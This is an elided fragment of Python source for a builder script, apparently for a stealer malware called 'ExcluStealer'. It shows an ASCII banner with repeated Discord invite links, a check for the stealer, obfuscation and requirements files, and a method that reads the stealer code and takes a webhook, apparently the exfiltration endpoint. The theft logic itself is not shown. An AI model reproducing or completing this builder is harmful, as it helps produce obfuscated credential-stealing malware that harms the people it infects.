...
class Builder:
 ...
 /$$$$$$$$ /$$   /$$  /$$$$$$  /$$       /$$   /$$     https://discord.gg/wSN88S8Vsf
| $$_____/| $$  / $$ /$$__  $$| $$      | $$  | $$     https://discord.gg/wSN88S8Vsf
| $$      |  $$/ $$/| $$  \__/| $$      | $$  | $$     https://discord.gg/wSN88S8Vsf
| $$$$$    \  $$$$/ | $$      | $$      | $$  | $$     https://discord.gg/wSN88S8Vsf  
| $$__/     >$$  $$ | $$      | $$      | $$  | $$     https://discord.gg/wSN88S8Vsf
| $$       /$$/\  $$| $$    $$| $$      | $$  | $$     https://discord.gg/wSN88S8Vsf
| $$$$$$$$| $$  \ $$|  $$$$$$/| $$$$$$$$|  $$$$$$/     https://discord.gg/wSN88S8Vsf
|________/|__/  |__/ \______/ |________/ \______/      https://discord.gg/wSN88S8Vsf
...
|"""
    ...
    def check(self):
        required_files = {'./ExcluStealer.py',
                          './requirements.txt',
                          './obfuscation.py'}
    ...
    def mk_file(self, filename, webhook):
        ...
        with open('./ExcluStealer.py', 'r', encoding="utf-8") as f:
            code = f.read()
